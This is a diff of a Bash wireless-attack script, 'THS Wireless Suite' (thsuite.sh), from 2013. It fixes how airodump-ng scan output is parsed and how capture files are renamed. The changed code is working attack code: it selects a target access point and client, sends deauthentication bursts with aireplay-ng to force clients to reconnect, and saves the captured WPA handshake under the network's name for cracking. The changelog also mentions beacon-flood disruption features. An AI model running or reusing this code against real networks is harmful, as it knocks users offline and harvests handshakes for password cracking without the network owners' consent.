@@ -2,7 +2,7 @@
 #THS Wireless Suite
 #thsuite.sh v0.2
 #By TAPE
-#Last edit 19-08-2013 20:15
+#Last edit 22-08-2013 23:30
 #Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
 #Tested on both with some options performing better on Kali
 #Source: http://thsuite.googlecode.com/svn/thsuite.sh
@@ -1138,9 +1138,9 @@ read DIFACE
 	fi 
 #
 TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $1}')
-TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
+TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep -a $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
 TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
-TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
+TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep -a $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
 #
 if [ "$DIFACE" != "$IFACE" ] ; then
 iwconfig $DIFACE channel $TARGET_CHAN
@@ -1153,28 +1153,33 @@ sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $DIFACE -0 5 -
 echo $GRN">$STD Deauth attempt on target AP complete"
 sleep 1
 #Rename capture file 
-CAPFILE="$THSDIR"wpa_temp-01.cap
+##
+CAPFILE="$THSDIR"wpa_temp*.cap		
 mv $CAPFILE $SAVEDIR"$TARGET_SSID".cap
 HANDSHAKE=$SAVEDIR"$TARGET_SSID".cap
+##
 #
 else
 #Using same interface for scanning and deauthing
 TARGET_AP=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $1}')
-TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
+TARGET_CHAN=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep -a $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
 TARGET_CL=$(cat /root/THS_TMP/scan_assist.tmp | sed -n "$LISTNR p" | awk '{print $2}')
-TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
+TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep -a $TARGET_AP | cut -d , -f 14 | sed 's/[ ]//')
 #
 echo $GRN">$STD Attempting to force & capture handshake"
 sleep 3 && xterm -T "THSuite" -geometry 105x20-0-0 -e aireplay-ng $IFACE -0 5 -a $TARGET_AP -c $TARGET_CL \
 & timeout 15 xterm -T "THSuite" -geometry 105x20-0+0 -e airodump-ng $IFACE -c $TARGET_CHAN --bssid $TARGET_AP --output-format cap -w "$THSDIR"wpa_temp
 #
+#
+echo $GRN">$STD Deauth attempt on target AP complete"
+sleep 1
 #Rename capture file 
-CAPFILE="$THSDIR"wpa_temp-01.cap
+CAPFILE="$THSDIR"wpa_temp*.cap 
 mv $CAPFILE $SAVEDIR"$TARGET_SSID".cap
 HANDSHAKE=$SAVEDIR"$TARGET_SSID".cap
 fi
 # tmp files deletion
-f_clean
+#f_clean
 if [ "$HANDSHAKE" == "$SAVEDIR"".cap" ] ; then
 echo $RED">$STD Failed to get data :("
 rm -rf $HANDSHAKE
@@ -1718,7 +1723,10 @@ fi
 # EDIT 19-08-2013
 # - Included OPN network option on Wireless Disruption beacon flood function
 # - Included the Network Restart attemp in Miscellaneous menu as well (so can run without wireless devices)
-#
+# EDIT 22-08-2013
+# - Fixed a bug when scans not being correctly read for automatic handshake grabbing
+#   (grep -a) 
+# 
 ##
 ### TO DO
 #########
@@ -1726,5 +1734,6 @@ fi
 # - ? Check for errors when deauth attack fails (5-1 / 5-2) to avoid unexpected errors (waiting for bug reports).
 # - ? Improve checking of monitor mode to allow names other than mon* (waiting for advice after more usage).
 # - ? Increase wireless disruption capabilities.
+
 
 
